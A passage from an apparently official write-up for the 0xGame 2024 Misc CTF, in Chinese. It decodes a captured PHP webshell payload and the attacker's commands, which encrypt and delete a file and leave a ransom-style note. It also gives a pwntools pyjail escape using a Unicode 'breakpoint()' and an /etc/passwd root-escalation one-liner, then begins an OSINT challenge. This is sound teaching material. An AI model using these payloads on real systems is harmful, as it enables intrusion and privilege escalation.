class="line">    <span class="variable">$s0</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$s1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$s0</span> == <span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$cmd</span>,<span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    @<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">    @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$PadtJn</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[, ]+/&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">FALSE</span> !== <span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">strtolower</span>(PHP_OS), <span class="string">&#x27;win&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$JueQDBH</span> = <span class="string">&#x27;is_callable&#x27;</span>;</span><br><span class="line">    <span class="variable">$Bvce</span> = <span class="string">&#x27;in_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;system&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;system&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;proc_open&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;proc_open&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$handle</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;r&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            )</span><br><span class="line">        ), <span class="variable">$pipes</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (! <span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$kWJW</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;passthru&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;passthru&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;shell_exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;shell_exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$kWJW</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="variable">$kWJW</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;popen&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="keyword">while</span> (! <span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="variable">$kWJW</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;</span>);</span><br><span class="line">        <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">getSafeStr</span>(<span class="variable">$kWJW</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;encode&quot;</span>;</span><br><span class="line">    <span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;Y2QgL2QgIkQ6XEFBQUNURlxXRUJccGhwU3R1ZHlfNjRccGhwc3R1ZHlfcHJvXFdXV1x1cGxvYWRcIiZkaXI=&quot;</span>;<span class="variable">$cmd</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cmd</span>);<span class="variable">$path</span>=<span class="string">&quot;RDovQUFBQ1RGL1dFQi9waHBTdHVkeV82NC9waHBzdHVkeV9wcm8vV1dXL3VwbG9hZC8=&quot;</span>;<span class="variable">$path</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$cmd</span>,<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><p>可以看到主要的操作是先将<code>$cmd</code>和<code>$path</code>进行<code>base64_decode</code>，之后执行并返回先<code>json_encode</code>后<code>Encrypt</code>的<code>$result</code>，<code>$result</code>中有两个信息，<code>base64_encode</code>后的<code>status</code>和<code>msg</code>，其中<code>msg</code>是执行系统命令后的回显结果。于是可以先分析出第三段进行的操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\&quot;&amp;dir</span></span><br></pre></td></tr></table></figure><p>结合流量的响应包可以分析出上述操作后的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">    <span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$after</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$after</span>[<span class="variable">$i</span>] = <span class="variable">$after</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd9eghDQVwxLhN6M2NDdiAgfXo2B0BcAwQKejN3Rh4DPEZMIV5eSyIJC0QgVVhXASt3XCFfWFsACw9aMFVHWj5KWFwvVV5TUQMPWC8BVXs2PEx6NgMCdDMsVnE1Vnx2CydxeglLcGgzIyZjIWNRY1Izd20tcV1aICtSUTNrB20YPARtLXFdWi4rUlEzawdtUSdNV1RLam9XAQFRPHtBV1AjX3wqVlNRKQAARxFuC1kzVX9xNFxLdCIsUnkeeAd5GCAHfCZyS3QyChp4J3hVfCEkDGcgX2FpDyQFfCd4VXwhJFN8JnJHfTcKG3ggcAJ5GCQBeR92AXAlJBt4MFZFeiEkU3wmcgprIwkxZQ14VXwhJFN8JnJVcCUkF3kDCXl4CCRNeyYLRXY1XRp7HXhVeAggAngxclVwJSQFfCd4VXwhJFN8JnJVcCUkGHggWlVWUA1YVyJER1ohDRVxNVZVfCEkU3wmclVwJSQFfCd4VXwhJEx8KmAGSBMENV1PagVBCyRTfCZyVXAlJAV8J3hVfCYoQ3scd15LPAMNXAtwfHYLJFN8JnJVcCUkBXwneFV8ISRTfCF6VQwqDBMAUUxHAABXYnwhegJ3HxIbex5SQXsIDk55IVRLdyUhDl9SZR1bDi5eWRdpVFYPCit7J14PCEAY&quot;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">Decrypt</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$d</span>);</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;IOmpseWKqOWZqCBEIOS4reeahOWNt+aYryDmlrDliqDljbcNCiDljbfnmoTluo\/liJflj7fmmK8gNTYxOS00MUI4DQoNCiBEOlxBQUFDVEZcV0VCXHBocFN0dWR5XzY0XHBocHN0dWR5X3Byb1xXV1dcdXBsb2FkIOeahOebruW9lQ0KDQoyMDI0LzA5LzE3ICAyMToxMCAgICA8RElSPiAgICAgICAgICAuDQoyMDI0LzA5LzE3ICAyMTowOCAgICA8RElSPiAgICAgICAgICAuLg0KMjAyNC8wOS8xNyAgMjE6MTAgICAgICAgICAgICAgICAzMDcgc2hlbGwucGhwDQogICAgICAgICAgICAgICAxIOS4quaWh+S7tiAgICAgICAgICAgIDMwNyDlrZfoioINCiAgICAgICAgICAgICAgIDIg5Liq55uu5b2VIDI0NywyNzksNjkzLDgyNCDlj6\/nlKjlrZfoioINCg==&quot;&#125;</span><br></pre></td></tr></table></figure><p>进行base64解码可以得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status:success</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msg:</span><br><span class="line"> 驱动器 D 中的卷是 新加卷</span><br><span class="line"> 卷的序列号是 5619-41B8</span><br><span class="line"></span><br><span class="line"> D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload 的目录</span><br><span class="line"></span><br><span class="line">2024/09/17  21:10    &lt;DIR&gt;          .</span><br><span class="line">2024/09/17  21:08    &lt;DIR&gt;          ..</span><br><span class="line">2024/09/17  21:10               307 shell.php</span><br><span class="line">               1 个文件            307 字节</span><br><span class="line">               2 个目录 247,279,693,824 可用字节</span><br></pre></td></tr></table></figure><p>之后一段段分析即可，整段攻击过程如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\&quot;&amp;dir</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 驱动器 D 中的卷是 新加卷</span></span><br><span class="line"><span class="string"> 卷的序列号是 5619-41B8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload 的目录</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2024/09/17  21:10    &lt;DIR&gt;          .</span></span><br><span class="line"><span class="string">2024/09/17  21:08    &lt;DIR&gt;          ..</span></span><br><span class="line"><span class="string">2024/09/17  21:10               307 shell.php</span></span><br><span class="line"><span class="string">               1 个文件            307 字节</span></span><br><span class="line"><span class="string">               2 个目录 247,279,693,824 可用字节</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">cd /d &quot;</span>D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\&quot;&amp;<span class="built_in">cd</span> ../</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;dir</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 驱动器 D 中的卷是 新加卷</span></span><br><span class="line"><span class="string"> 卷的序列号是 5619-41B8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW 的目录</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2024/09/17  21:08    &lt;DIR&gt;          .</span></span><br><span class="line"><span class="string">2024/09/07  18:30    &lt;DIR&gt;          ..</span></span><br><span class="line"><span class="string">2024/09/16  23:22               332 index.html</span></span><br><span class="line"><span class="string">2024/09/17  20:21                75 unfinished_hello.php</span></span><br><span class="line"><span class="string">2024/09/17  21:10    &lt;DIR&gt;          upload</span></span><br><span class="line"><span class="string">2024/09/17  11:07             1,202 upload.php</span></span><br><span class="line"><span class="string">               3 个文件          1,609 字节</span></span><br><span class="line"><span class="string">               3 个目录 247,279,693,824 可用字节</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd /d &quot;</span>D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;openssl version</span><br><span class="line"></span><br><span class="line">WARNING: can<span class="string">&#x27;t open config file: /usr/local/ssl/openssl.cnf</span></span><br><span class="line"><span class="string">OpenSSL 1.0.2p  14 Aug 2018</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd /d &quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;openssl enc -aes-128-cbc -in unfinished_hello.php -out secret.php -iv 114514 -K c4d038b4bed09fdb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WARNING: can&#x27;</span>t open config file: /usr/local/ssl/openssl.cnf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;del unfinished_hello.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd /d &quot;</span>D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;<span class="built_in">echo</span> <span class="string">&quot;If you want to decrypt your file, give me a copy of your calculus homework. UwU&quot;</span> &gt; readme.txt</span><br></pre></td></tr></table></figure><p>可以看到是用<code>openssl</code>对<code>unfinished_hello.php</code>进行了文件加密，且删掉了原文件，只需要用<code>openssl</code>解<code>secret.php</code>即可拿到原文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl aes-128-cbc -d -<span class="keyword">in</span> secret.php -out flag.php -iv 114514 -K c4d038b4bed09fdb</span><br></pre></td></tr></table></figure><p>输出的<code>flag.php</code>文件内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//0xGame&#123;8552BB81-D51A-FDCE-2EF1-55EBBEFF9B9C&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, </span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="untouchable-flag">Untouchable flag</h3><p>题目附件为<code>pyjail.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pyjail</span>():</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&quot;[a-zA-Z0-9]&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> re.findall(pattern,code):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Some characters in your code are banned.&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(code) &gt; <span class="number">12</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Your code is too long.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">eval</span>(code)</span><br></pre></td></tr></table></figure><p>可以看到禁用了所有字母和数字，并且对代码长度有所限制，必须不大于12</p><p>nc连上后题目还给了一个hint:<code>the Python version is greater than 3.7.</code>，网上找找可以知道python3支持非ASCII字符，可以用unicode字符绕过第一个限制，并且还可以找到从Python3.7开始引入了breakpoint()函数，于是可以绕过第二个限制进行rce：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.98.178.117&quot;</span>, <span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()&quot;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>拿到shell后直接读flag发现不行，<code>ls- l</code>查看文件权限可以看到flag文件只有root可读，需要寻找提权的方法</p><p>预期解是/etc/passwd提权，可以看到环境中该文件所有用户可读可写，直接写入一个拥有root权限的用户即可</p><p>办法有很多，这里拿openssl举例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt <span class="built_in">test</span> z9nn8w</span><br><span class="line"></span><br><span class="line">$1$<span class="built_in">test</span><span class="variable">$eicwC</span>/tivElau/ii72ooo0</span><br></pre></td></tr></table></figure><p>写入/etc/passwd再切换用户即可拿到root权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;w8nn9z:$1$test$eicwC/tivElau/ii72ooo0:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br><span class="line"></span><br><span class="line">su w8nn9z</span><br><span class="line">z9nn8w</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> flag</span><br><span class="line">0xGame&#123;PyJ@i1_w1Th_P@sswd_3l3Vat3_pr1v1l3g3&#125;</span><br></pre></td></tr></table></figure><h2 id="osint">OSINT</h2><h3 id="互联网的一角">互联网的一角*</h3><p>访问题目页面，摁F12就可以看到前端有注释</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496038143-772e7f75-6c33-4116-b94c-c0d36f545137.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里的注释指的是要求查询CNAME记录，后面上的hint中也给出了。查询CNAME记录的方法其实有很多，ping、nslookup、dig等等都可以，最简单的就是这里直接ping一下。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496038235-4d8653c5-31da-4d1b-b764-63526956deee.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>对于.github.io，如果有经验的话一眼就知道这是githubpages。如果不知道，查找一下也很快能得知，这是github上一个叫做oxg4me2024的用户搭建的页面，去github上搜索一下这个用户。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496038235-e0196d4a-c59c-41ed-89c5-415f4634b550.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>一路顺藤摸瓜找进去，可以找到flag.txt</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496038439-fc672b55-e3f9-4f20-a427-05f89a278b93.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>但是flag.txt的内容并不是flag，这里点击右上角的History，查询这个文件的修改历史即可看到flag</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496038352-7848d4ed-657a-46b7-8544-ab7f3a4ebc78.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496039022-84e0b736-aacc-4478-909c-cd8575d148cd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="给我干哪来了这还是国内吗">给我干哪来了，这还是国内吗？？*</h3><p>图寻题，就是要求找出图片中的地方</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496039163-3beb9aaf-8f2c-4881-8918-7fd3ffcc6d97.png"alt="img" /><figcaption 